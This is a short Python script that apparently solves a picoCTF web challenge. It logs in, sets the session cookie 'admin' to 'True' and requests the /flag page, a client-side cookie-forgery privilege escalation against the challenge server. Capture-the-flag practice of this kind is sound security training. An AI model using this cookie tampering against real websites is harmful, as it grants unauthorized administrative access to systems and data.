url = 'http://jupiter.challenges.picoctf.org:13594'
import requests

page = requests.get(url)
cookies = page.cookies
print(cookies)

login = requests.post(url+'/login',data={'user':'oe','password':'admin'})
# print(login.text)
cookies = login.cookies.get_dict()

cookies['admin'] = 'True'

print(cookies)
flag = requests.get(url+'/flag',cookies=cookies)
print(flag.text)
print(cookies)